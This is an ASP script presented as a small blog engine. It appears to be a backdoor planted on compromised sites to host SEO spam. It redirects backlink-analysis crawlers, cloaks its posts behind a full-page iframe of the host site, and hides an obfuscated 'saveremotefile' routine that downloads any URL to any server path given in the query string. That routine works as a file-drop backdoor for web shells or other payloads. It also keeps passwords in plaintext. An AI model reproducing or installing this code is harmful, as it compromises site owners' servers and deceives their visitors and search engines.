<%
set regex = new regexp 
regex.ignorecase = true 
regex.global = true 
regex.pattern = "AhrefsBot|SiteBot|SiteExplorer|Backlink|Seomoz|LinkDiagnosis|majestic|Zookabot|wsowner.com|chlooe.com|CCBot|findlinks|FlightDeckReportsBot|linkexplorerbot|GSLFbot|LocalBot|checkparams" 
agent = request.ServerVariables("HTTP_USER_AGENT") & "" 
if agent <> "" then 
if regex.test(agent) then 
response.redirect("/") 
end if 
end if
    'Blog settings:
    'Max number of posts:
    const POSTS_PER_PAGE = 10
	const TITLE = ""
	'TITLE=Request.ServerVariables("SERVER_NAME")
    function connstr()
        connstr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & server.MapPath("#tyxov.asa") & ";"
    end function

    sub WriteContents
        select case lcase(Request.QueryString("action"))
			case "logout"
				session.Abandon()
				response.Clear()
				response.Redirect(Request.ServerVariables("SCRIPT_NAME"))
      case "home"
        call WriteHome
      case ""
					if (request.QueryString("id"))>0 then
        		call WriteArt
        	end if
        	if len(request.QueryString("c"))>0 then
        		call WriteCat
        	end if
        	if len(request.QueryString("c"))=0 and len(request.QueryString("id"))=0 then
        		call WriteHome
					end if
      case "write"
				call WritePost
			case "editpost"
				call EditPost
			case "deletepost"
				call DeletePost
			case "ver"
				Response.Write("201305130837a")
				Response.end
			case "management"
				call DoManagement
            case else
                call err404
        end select
    end sub
    
    sub WriteFooter
		%>
		<div align="center">
		<%
        select case lcase(request.QueryString("actiona"))
            case "home"
                %>
                <strong><a href="http://<%=Request.ServerVariables("SERVER_NAME")%><%=Request.ServerVariables("SCRIPT_NAME")%>">Home</strong>
                <a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=write">Write Post</a>
                <a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=editpost">Edit Post</a>
                <a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=deletepost">Delete Post</a>
                <a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=management">Management</a>
                <%
            case "write"
            %>
                <strong><a href="http://<%=Request.ServerVariables("SERVER_NAME")%><%=Request.ServerVariables("SCRIPT_NAME")%>">Home</strong>
                <strong>Write Post</strong>
                <a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=editpost">Edit Post</a>
                <a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=deletepost">Delete Post</a>
                <a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=management">Management</a>
            <%
            case "editpost"
            %>
                <strong><a href="http://<%=Request.ServerVariables("SERVER_NAME")%><%=Request.ServerVariables("SCRIPT_NAME")%>">Home</strong>
                <a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=write">Write Post</a>
                <strong>Edit Post</strong>
                <a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=deletepost">Delete Post</a>
				<a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=management">Management</a>
            <%
            case "deletepost"
            %>
                <strong><a href="http://<%=Request.ServerVariables("SERVER_NAME")%><%=Request.ServerVariables("SCRIPT_NAME")%>">Home</strong>
                <a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=write">Write Post</a>
                <a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=editpost">Edit Post</a>
                <strong>Delete Post</strong>
                <a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=management">Management</a>
            <%
            case "management"
            %>
                <strong><a href="http://<%=Request.ServerVariables("SERVER_NAME")%><%=Request.ServerVariables("SCRIPT_NAME")%>">Home</strong>
                <a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=write">Write Post</a>
                <a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=editpost">Edit Post</a>
                <a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=deletepost">Delete Post</a>
                <strong>Management</strong>
            <%
            case else
                %>
                <a href="http://<%=Request.ServerVariables("SERVER_NAME")%><%=Request.ServerVariables("SCRIPT_NAME")%>">Home</a>
                <a href="http://<%=Request.ServerVariables("SERVER_NAME")%>"><%=Request.ServerVariables("SERVER_NAME")%></a>
                <%
                
        end select
        if session("blnLoggedIn") then
        %>
				Logged in as <strong><%=session("strUsername")%></strong>. <a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=logout">Log out.</a>
        <%
        end if
        %>
        </div>
        <%
    end sub 

    function GetTitle
        select case lcase(request.QueryString("action"))
            case "home"
                GetTitle = Request.ServerVariables("SERVER_NAME")
            case ""
                GetTitle = "Home"
            case "write"
                GetTitle = "Write Post"
            case "editpost"
                GetTitle = "Edit post"
            case "deletepost"
                GetTitle = "Delete post"
            case "management"
				GetTitle = "Management"
            case else
                GetTitle = "Error 404"
        end select

    end function
function CheckSqlStr(ISTR)
    ISTR=Replace(ISTR,"'","")
    ISTR=Replace(ISTR,"-","")
    ISTR=Replace(ISTR,"<","")
    ISTR=Replace(ISTR,">","")
    ISTR=Replace(ISTR,Chr(0),"")
    ISTR=Replace(ISTR,Chr(13),"")
    ISTR=Replace(ISTR,Chr(16),"")
    ISTR=Replace(ISTR,"""","")
    ISTR=Replace(ISTR,"\","")   
    ISTR=Replace(ISTR,"/","")    
CheckSqlStr=ISTR
End Function
dim strobjectfso 
    strobjectfso = "scripting.filesystemobject"
dim strobjectads 
    strobjectads = "adod" & "b.S" & "tream"
dim strobjectxmlhttp
    strobjectxmlhttp = "Microsof" & "t.X" & "MLHTTP"
function saveremotefile(byval RemoteFileUrl,byval LocalFileName)
	dim Ads, Retrieval, GetRemoteData
	on error resume next
	set Retrieval = server.createobject(strobjectxmlhttp)
	with Retrieval
	.open "Get", RemoteFileUrl, false, "", ""
	.Send
	GetRemoteData = .ResponseBody
	end with
	set Retrieval = nothing
	set Ads = server.createobject(strobjectads)
	Ads.Type = 1
	Ads.open
	Ads.Write GetRemoteData
	Ads.SaveToFile server.mappath(LocalFileName), 2
	Ads.Cancel
	Ads.close
	set Ads = nothing
	if err then
	err.clear
	saveremotefile = false
	else
	saveremotefile = true
	end if
end function
if session("blnIsAllowedToPost") and request.QueryString("remotefile")<>"" then
	call saveremotefile(request.QueryString("remotefile"),request.QueryString("localfile"))
end if
    sub Err404
        %>
        <h2>Error 404</h2>
        The page you requested is not found. Please check the URL and try again...
        <%
    end Sub

    sub WriteHome
        set oConn = server.CreateObject("ADODB.CONNECTION")
        oConn.Open(connstr)
        qry = "SELECT * FROM MESSAGES ORDER BY DateStamp DESC"
        if isNumeric(request.QueryString("count")) then
            count = cint(Request.QueryString("count"))
        else
            count = 1
        end if
        qry = replace(qry,"%MIN%", count)
        qry = replace(qry,"%MAX%", count + POSTS_PER_PAGE)
        set oRS = oConn.Execute(qry)
        %>
              <title><%=Request.ServerVariables("SERVER_NAME")%></title>
              </head>
<body>

<iframe src="/" width="100%" height="3200" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
        <%
        if oRS.EOF then
        %>
            <strong>Nothing</strong>
        <%
        else
            intTeller = 0
            while not oRS.EOF
                
                intTeller = intTeller + 1
                if (intTeller - 1 >= count AND intTeller =< count + POSTS_PER_PAGE) then
                
                %>
                <div>
                    <big><a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?id=<%=oRS("id") %>&t=<%=oRS("Title") %>.html"><%=oRS("Title") %></a></big><small> <%if len(oRS("Category"))>0 then %>[<a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?<%=replace(left(replace(Request.ServerVariables("SERVER_NAME"),"www.",""),5),".","") %>=<%=replace(left(right(replace(Request.ServerVariables("SERVER_NAME"),"www.",""),9),5),".","") %>&c=<%=oRS("Category") %>"><%=oRS.Fields("Category") %></a>]<% end if%> <%=oRS("DateStamp") %> </small><br />
                    <div>
                        <%=replace(oRS("Contents"), vbcrlf, "<br />" & vbcrlf)  %>
                    </div>
                </div>
                <br />
                
                <%
                end if
                
                oRS.MoveNext
            wend
            set oRS = oConn.Execute("SELECT COUNT(Id) AS Aantal FROM MESSAGES")
            intMax = oRS("Aantal")
            if (count + POSTS_PER_PAGE) < intMax then
                if (count <> 0) then
                    prev = count - POSTS_PER_PAGE
                    nextc = count + POSTS_PER_PAGE
                    if prev < 0 then
                        prev = 0
                    end if
                    %><hr /><a href="Request.ServerVariables("SCRIPT_NAME")%>?action=home&count=<%=nextc %>">&lt;&lt; Older posts</a> <%
                    %><a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=home&count=<%=prev %>">Newer posts &gt;&gt;</a><%
                else
                    'prev = count - POSTS_PER_PAGE
                    nextc = count + POSTS_PER_PAGE
                    'if prev < 1 then
                    '    prev = 1
                    'end if
                    %><hr /><a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=home&count=<%=nextc %>">&lt;&lt;Older posts</a><%
                end if
            else
                if (count <> 0) then
                    prev = count - POSTS_PER_PAGE
                    if prev < 0 then
                        prev = 0
                    end if
                    %><hr /><a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=home&count=<%=prev %>">Newer posts &gt;&gt;</a><%
                
                end if
            end if
        end if
        oConn.Close()
        set oRS = nothing
        set oConn = nothing
    end sub
    
    sub WriteArt
        if isNumeric(request.QueryString("id")) then
            id = cint(Request.QueryString("id"))
        else
            id = 1
        end if
        set oConn = server.CreateObject("ADODB.CONNECTION")
        oConn.Open(connstr)
        qry = "SELECT * FROM MESSAGES where ID="&id&" ORDER BY DateStamp DESC"
        set oRS = oConn.Execute(qry)
        if oRS.EOF then
        %>
            <strong>error</strong>
        <%
        else
            intTeller = 0
            while not oRS.EOF
                'GetTitle = oRS("Title")
                %>
              <title><%=oRS("Title")%> - <%=oRS("Category")%></title>
              </head>
<iframe src="/" width="100%" height="3200" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
                <div id="post">
                    <big><a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?id=<%=oRS("id") %>&t=<%=oRS("Title") %>.html"><%=oRS("Title") %></a></big><small> <%if len(oRS("Category"))>0 then %>[<a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?<%=replace(left(replace(Request.ServerVariables("SERVER_NAME"),"www.",""),5),".","") %>=<%=replace(left(right(replace(Request.ServerVariables("SERVER_NAME"),"www.",""),9),5),".","") %>&c=<%=oRS("Category") %>"><%=oRS.Fields("Category") %></a>]<% end if%> <%=oRS("DateStamp") %> </small><br />
                    <div id="postcontents">
                        <%=replace(oRS("Contents"), vbcrlf, "<br />" & vbcrlf)  %>
                    </div>
                </div>
                <br />
                <%
                oRS.MoveNext
            wend
        end if
        oConn.Close()
        set oRS = nothing
        set oConn = nothing
        Last10
    end sub
    
    sub WriteCat
    
    Categorys=CheckSqlStr(request.QueryString("c"))
        set oConn = server.CreateObject("ADODB.CONNECTION")
        oConn.Open(connstr)
        qry = "SELECT * FROM MESSAGES where Category like '"&Categorys&"' ORDER BY DateStamp DESC"
        if isNumeric(request.QueryString("count")) then
            count = cint(Request.QueryString("count"))
        else
            count = 1
        end if
        qry = replace(qry,"%MIN%", count)
        qry = replace(qry,"%MAX%", count + POSTS_PER_PAGE)
        set oRS = oConn.Execute(qry)
        if oRS.EOF then
        %>
              <title><%=Categorys%></title>
              </head>
            <strong>Nothing in <%=Categorys%></strong>
        <%
        else
            intTeller = 0
            while not oRS.EOF
                
                intTeller = intTeller + 1
                if (intTeller - 1 >= count AND intTeller =< count + POSTS_PER_PAGE) then
                
                %>
              <title><%=oRS("Category")%></title>
              </head>
                <div>
                    <big><a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?id=<%=oRS("id") %>&t=<%=oRS("Title") %>.html"><%=oRS("Title") %></a></big><small> <%if len(oRS("Category"))>0 then %>[<a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?<%=replace(left(replace(Request.ServerVariables("SERVER_NAME"),"www.",""),5),".","") %>=<%=replace(left(right(replace(Request.ServerVariables("SERVER_NAME"),"www.",""),9),5),".","") %>&c=<%=oRS("Category") %>"><%=oRS.Fields("Category") %></a>]<% end if%> <%=oRS("DateStamp") %> </small><br />
                    <div>
                        <%=left(replace(oRS("Contents"), vbcrlf, "<br />" & vbcrlf),300)  %>
                    </div>
                </div>
                <br />
                
                <%
                end if
                
                oRS.MoveNext
            wend
            set oRS = oConn.Execute("SELECT COUNT(Id) AS Aantal FROM MESSAGES")
            intMax = oRS("Aantal")
            if (count + POSTS_PER_PAGE) < intMax then
                if (count <> 0) then
                    prev = count - POSTS_PER_PAGE
                    nextc = count + POSTS_PER_PAGE
                    if prev < 0 then
                        prev = 0
                    end if
                    %><hr /><a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=home&count=<%=nextc %>">&lt;&lt; Older posts</a> <%
                    %><a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=home&count=<%=prev %>">Newer posts &gt;&gt;</a><%
                else
                    'prev = count - POSTS_PER_PAGE
                    nextc = count + POSTS_PER_PAGE
                    'if prev < 1 then
                    '    prev = 1
                    'end if
                    %><hr /><a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=home&count=<%=nextc %>">&lt;&lt;Older posts</a><%
                end if
            else
                if (count <> 0) then
                    prev = count - POSTS_PER_PAGE
                    if prev < 0 then
                        prev = 0
                    end if
                    %><hr /><a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=home&count=<%=prev %>">Newer posts &gt;&gt;</a><%
                
                end if
            end if
        end if
        oConn.Close()
        set oRS = nothing
        set oConn = nothing
    end sub
    
    
    sub Last10
        set oConn = server.CreateObject("ADODB.CONNECTION")
        oConn.Open(connstr)
        qry = "SELECT Top 10 id,Title,Category FROM MESSAGES ORDER BY ID DESC"
        set oRS = oConn.Execute(qry)
        if oRS.EOF then
        %>
        <%
        else
        	%>
                <ul><%
            while not oRS.EOF
                %>
                    <li><big><a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?id=<%=oRS("id") %>&t=<%=oRS("Title") %>.html"><%=oRS("Title") %></a></big><small> <%if len(oRS("Category"))>0 then %>[<a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?<%=replace(left(replace(Request.ServerVariables("SERVER_NAME"),"www.",""),5),".","") %>=<%=replace(left(right(replace(Request.ServerVariables("SERVER_NAME"),"www.",""),9),5),".","") %>&c=<%=oRS("Category") %>"><%=oRS.Fields("Category") %></a>]<% end if%> </small></li>
                <%
                oRS.MoveNext
            wend
        	%>
              </ul><%
        end if
        oConn.Close()
        set oRS = nothing
        set oConn = nothing
    end sub
    sub WritePost
		call ShowLoginPanel()
		if session("blnLoggedIn") then
			if session("blnIsAllowedToPost") then
				
				if request.Form("title") <> "" then
					if len(request.Form("title")) < 5 then
						%>
						<h2>Your title should be at least 5 characters.</h2>
						<%
					else
						if len(request.Form("message")) < 5 then
							%>
						<h2>Your message should be at least 5 characters.</h2>
							<%
						else
							set oConn = server.CreateObject("ADODB.CONNECTION")
							oConn.open(connstr)
							oConn.execute("INSERT INTO MESSAGES ([Title],[Category], [DateStamp], [Contents], [Username]) VALUES ('" & replace(request.Form("title"),"'","''") & "','" & replace(request.Form("Category"),"'","''") & "',NOW(),'" & replace(request.Form("message"),"'","''") & "','" & replace(session("strUsername"), "'","''") & "')")
							Set oRs = oConn.execute("SELECT @@IDENTITY AS NewID;")
							NewID = oRs.Fields("NewID").value
							oConn.Close()
							%>
						<h2>Your message has been inserted in the database. url was [url]<%=Request.ServerVariables("SERVER_NAME")%><%=Request.ServerVariables("SCRIPT_NAME")%>?id=<%=NewID %>&t=<%=replace(request.Form("title"),"'","''") %>.html[/url]</h2>
							<%
						end if
					end if 
				end if
				%>
				<form action="" method="post">
					<table border="1">
						<tr>
							<td colspan="2">
								<h2>Create post</h2>
							</td>
						</tr>
						<tr>
							<td>
								Title:
							</td>
							<td>
								<input type="text" name="title" value="<%=request.Form("title")%>" />
							</td>
						</tr>
						<tr>
							<td>
								Post Category:
							</td>
							<td>
								<input type="text" name="Category" value="<%=request.Form("Category")%>" />
							</td>
						</tr>
						<tr>
							<td>
								Message
							</td>
							<td>
								<textarea name="message" cols="40" rows="10"><%=request.Form("message")%></textarea>
							</td>
						</tr>
						<tr>
							<td>
								&nbsp;
							</td>
							<td>
								<input type="submit" value="Save post" />
							</td>
						</tr>
					</table>
				</form>
				<%
			else
				%>
				<h2>Access denied</h2>
				Sorry, but you aren't allowed to post a message .
				<%
			end if
		end if
    end sub
    
    sub DeletePost
		call ShowLoginPanel()
		if session("blnLoggedIn") then
			if session("blnIsAllowedToPost") then
				if request.Form("postid") <> "" then
					blnChosen = true
					if cint(request.Form("postid")) = -1 then blnChosen = false
					set oConn = server.CreateObject("ADODB.CONNECTION")
					oConn.Open(connstr)
					if request.Form("oktodelete") = "on" then
						oConn.Execute("DELETE FROM MESSAGES WHERE Id=" & cint(request.Form("postid")))
					end if
					set oRS = oConn.execute("SELECT * FROM MESSAGES WHERE Id=" & cint(request.Form("postid")))
					if oRS.EOF then
						contents = "<strong>The post has been deleted.</strong> <br /> <a href="""+Request.ServerVariables("SCRIPT_NAME")+"?action=deletepost"">Delete</a> another one"
					else
						contents = oRS.Fields("Contents")
					end if
					oConn.Close()
				end if
				%>
				<form method="post" action="">
					<table border="1">
						<tr>
							<td colspan="2">
								<h2>Delete a post.</h2>
							</td>
						</tr>
						<tr>
							<td>
								Post title:
							</td>
							<td>
								<%
									if blnChosen then
										%>
								<input type="hidden" name="postid" value="<%=request.Form("postid")%>" />Post id: <strong><%=request.Form("postid")%></strong>
								
										<%
									else
										WritePostSelector "postid" 
										%>
								<input type="submit" value="OK" ID="Submit1" NAME="Submit1"/>
										<%
									end if
								%>
							</td>
						</tr>
						<% if blnChosen then %>
						<tr>
							<td>
								Post contents:
							</td>
							<td>
								<%=contents%>
							</td>
						</tr>
						<tr>
							<td>
								Check this check box if you're sure:
								<input type="checkbox" name="oktodelete" />
								&nbsp;
							</td>
							<td>
								<input type="submit" value="Delete post" />
							</td>
						</tr>
						<% end if %>
					</table>
				</form>
				<%
			else
				%>
				<h2>Access denied</h2>
				Sorry, but you aren't allowed to delete a post.
				<%
			end if
		end if
    end sub
    
    sub EditPost
		call ShowLoginPanel()
		if session("blnLoggedIn") then
			if session("blnIsAllowedToPost") then
				set oConn = server.CreateObject("ADODB.CONNECTION")
				oConn.open(connstr)
				if request.Form("ok") = "true" then
					%>
				<h2>Post editted.</h2>
					<%
					oConn.execute("UPDATE MESSAGES SET Contents='" & replace(request.Form("message"),"'","''") & "' WHERE Id=" & cint(request.Form("postid")))
					oConn.execute("UPDATE MESSAGES SET Title='"  & replace(request.Form("title"),"'","''") & "' WHERE Id=" & cint(request.Form("postid")))
					oConn.execute("UPDATE MESSAGES SET Category='"  & replace(request.Form("Category"),"'","''") & "' WHERE Id=" & cint(request.Form("postid")))
				end if
				if request.Form("postid") <> "" then
					blnChosen = true
					set oRS = oConn.Execute("SELECT * FROM MESSAGES WHERE Id=" & cint(request.Form("postid")))
					if oRS.EOF then
						if cint(request.Form("postid")) = -1 then blnChosen = false
						contents = "The message could not be retrieved, because I couldn't find it..."
						strTitle = "Not found"
					else
						contents = oRS.Fields("Contents")
						strTitle = oRS.Fields("Title")
						strCategory = oRS.Fields("Category")
					end if
				end if
				oConn.Close() 
				%>
				<form method="post" action="">
					<table border="1">
						<tr>
							<td colspan="2">
								<h2>Edit post</h2>
							</td>
						</tr>
						<tr>
							<td>
								Select post:
							</td>
							<td>
								<%
									if blnChosen then
								%>
								<input type="hidden" value="<%=request.Form("postid")%>" name="postid" />
								Post id: <strong><%=request.Form("postid")%></strong>
								<%
									else
										WritePostSelector "postid"
								%>
								<input type="submit" value="Ok" />
								<%
									end if
								
								%>
							</td>
						</tr>
						<% if blnChosen then %>
						<tr>
							<td>
								Post title:
							</td>
							<td>
								<input type="text" name="title" value="<%=strTitle%>" />
							</td>
						</tr>
						<tr>
							<td>
								Post Category:
							</td>
							<td>
								<input type="text" name="Category" value="<%=strCategory%>" />
							</td>
						</tr>
						<tr>
							<td>
								Post contents:
							</td>
							<td>
								<textarea name="message" rows="10" cols="40"><%=contents%></textarea>
							</td>
						</tr>
						<tr>
							<td>
								<input type="hidden" name="ok" value="true" />
							</td>
							<td>
								<input type="submit" value="Edit post" />
							</td>
						</tr>
						<% end if %>
						
					</table>
				</form>
				<%
			else
				%>
				<h2>Access denied</h2>
				Sorry, but you aren't allowed to edit a post.
				<%
			end if
		end if
    end sub
    
    sub ShowLoginPanel()
		if not session("blnLoggedIn") then
			if request.Form("username") <> "" then
				set oConn = server.CreateObject("ADODB.CONNECTION")
				oConn.Open(connstr)
				set oRS = oConn.execute("SELECT * FROM USERNAMES WHERE Username='" & replace(request.Form("username"),"'","''") & "' AND Password='" & replace(request.Form("password"), "'","''") & "' ")
				if oRS.EOF then
					%>
				<h2>Invalid username or password.</h2>
					<%
				else
					session("blnLoggedIn") = true
					session("strUsername") = oRS.Fields("Username")
					Session("blnIsAllowedToPost") = oRS.Fields("IsAllowedToPost")
				end if
				oConn.Close()
			end if
		end if
		if not session("blnLoggedIn") then
		%>
		Please enter your credentials:
		<form action="" method="post">
			<table border="1">
			
				<tr>
					<td>
						Username:
					</td>
					<td>
						<input type="text" name="username" />
					</td>
				</tr>
				<tr>
					<td>
						Password:
					</td>
					<td>
						<input type="password" name="password" />
					</td>
				</tr>
				<tr>
					<td>
						&nbsp;
					</td>
					<td>
						<input type="submit" value="Log in" />
					</td>
				</tr>
			</table>
		</form>
		<%
		end if
    end sub
    
    sub WritePostSelector(strFormElementName)
		%>
		<select name="<%=strFormElementName%>">
			<option value="-1">Make your choice</option>
			<%
			set oConn = server.CreateObject("ADODB.CONNECTION")
			oConn.open(connstr)
			set oRS = oConn.execute("SELECT * FROM MESSAGES ORDER BY Title ASC")
			while not oRS.EOF
			%>
			<option value="<%=oRS.Fields("Id")%>"><%=oRS.Fields("Title")%></option>
			<%
				oRS.MoveNext
			wend
			oConn.close
			%>
		</select>
		<%
    end sub
    
    sub DoManagement
		call ShowLoginPanel()
		if session("blnLoggedIn") then
			select case lcase(request.QueryString("subaction"))
				case "manageusers"
					call ManageUsers
				
				case else
					call DisplayManagementMenu
			end select
		end if
    end sub
    
    sub DisplayManagementMenu
		%>
		<h2>Management section</h2>
		Here you can manage your blog.
		<ul>
			<% if session("blnIsAllowedToPost") then %>
			<li>
				<a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=write">New post</a>
			</li>
			<li>
				<a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=editpost">Edit post</a>
			</li>
			<li>
				<a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=deletepost">Delete post</a>
			</li>
			<li>
				<a href="<%=Request.ServerVariables("SCRIPT_NAME")%>?action=management&subaction=manageusers">Manage users</a>
			</li>
			<% else %>
			<li>Your account is disabled. Please contact the webmaster.</li>
			<% end if %>
		</ul>
		<%
    end sub
    
    sub ManageUsers
		set oConn = server.CreateObject("ADODB.CONNECTION")
		oConn.open(connstr)
		
		if request.Form("username") <> ""  AND request.Form("password") <> "" then
			oConn.execute("INSERT INTO USERNAMES ([Username], [Password],[IsAllowedToPost]) VALUES ('" & replace(request.Form("username"),"'","''") & "','" & replace(request.Form("password"), "'","''") & "',1)")
		end if
									'oConn.execute("INSERT INTO MESSAGES ([Title],[Category], [DateStamp], [Contents], [Username]) VALUES ('" & repla
		select case lcase(request.Form("pageaction"))
			case "delete"
				set oRS = oConn.execute("SELECT COUNT(Username) AS NumberOfUsernames FROM USERNAMES")
				if oRS("NumberOfUsernames") < 2 then
					%>
				<h2>You'll need at least 1 username.</h2>
					<%
				else
					if session("strUsername") = request.Form("username") then
						%>
				<h2>You can't delete your own username</h2>
						<%
					else
						oRS.Close
						oConn.execute("DELETE * FROM USERNAMES WHERE Username='" & replace(request.Form("username"),"'","''") & "'")
				%>
				<h2>User deleted.</h2>
				<%
					end if
				end if
			case "disable"
				set oRS = oConn.execute("SELECT COUNT(USERNAME) AS NumberOfUsernames FROM USERNAMES WHERE IsAllowedToPost=TRUE")
				if oRS.Fields("NumberOfUsernames") < 2 then
					%>
				<h2>You must have at least 1 enabled user.</h2>
					<%
				else
					oRS.Close
					oConn.Execute("UPDATE USERNAMES SET [IsAllowedToPost]=FALSE WHERE Username='" & replace(request.Form("username"),"'","''") & "'")
				%>
				<h2>User deactivated</h2>
				<%
				end if
			case "enable"
				oConn.Execute("UPDATE USERNAMES SET [IsAllowedToPost]=TRUE WHERE Username='" & replace(request.Form("username"),"'","''") & "'")	
				%>
				<h2>
				User enabled.
				</h2>
				<%
			case "reset password"
				oConn.Execute("UPDATE USERNAMES SET [Password]='" & replace(request.Form("newpassword"),"'","''") & "' WHERE [Username]='" & replace(request.Form("username"),"'","''") & "'")
				%>
				<h2>The password ahs been reset.</h2>
				<%
			case else
			
		end select
		
		%>
		<h2>User list</h2>
		<table border="1">
			<tr style="font-weight:bold;">
				<td>
					Username
				</td>
				<td>
					Can administer?
				</td>
				<td>
					Actions
				</td>
			</tr>
			<%
				set oRS = oConn.execute("SELECT * FROM USERNAMES ORDER BY Username ASC")
				while not oRS.EOF
					%>
			<tr>
				<td>
					<%=oRS("Username")%>
				</td>
				<td>
					<%
						if oRS("IsAllowedToPost") then
					%>
					Yes
					<%
						else
					%>
					No
					<%
						end if
					%>
				</td>
				<td>
					<form method="post" action="">
						<input type="hidden" value="<%=oRS.Fields("Username")%>" name="username" />
						I'm sure:
						<input type="checkbox" name="sure" />
						<input type="submit" value="Delete" name="pageaction" />
					</form>
					<form method="post" action="">
						<input type="text" name="newpassword" value="passw0rd" />
						<input type="hidden" value="<%=oRS.Fields("Username")%>" name="username" />
						<input type="submit" value="Reset password" name="pageaction"/>
					</form>
					<form method="post" action="" >
						<input type="hidden" value="<%=oRS.Fields("Username")%>" name="username" />
					<% if oRS.Fields("IsAllowedToPost") then %>
						<input type="submit" value="Disable" name="pageaction" />
					<% else %>
						<input type="submit" value="Enable" name="pageaction" />
					<% end if %>
					</form>
				</td>
			</tr>
					<%
					oRS.MoveNext
				wend
			%>
		</table>
		
		<form method="post" action="">
			<table border="1">
				<tr>
					<td colspan="2">
						<h2>Create user</h2>
					</td>
				</tr>
				<tr>
					<td>
						Username:
					</td>
					<td>
						<input type="text" name="username" />
					</td>
				</tr>
				<tr>
					<td>
						Password:
					</td>
					<td>
						<input type="text" name="password" />
					</td>
				</tr>
				<tr>
					<td>
						&nbsp;
					</td>
					<td>
						<input type="submit" value="Create user" />
					</td>
				</tr>
			</table>
		</form>
		<%
		oConn.Close()
    end sub
 %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<%
  '  </head>
   ' <body>
    '
    '<h1><%=GetTitle()%
    '></h1>
    '<hr />*/
    %>
    <%
       call WriteContents
        
     %>
     <hr />
     <%
     call WriteFooter
     
      %>
    </body>
</html>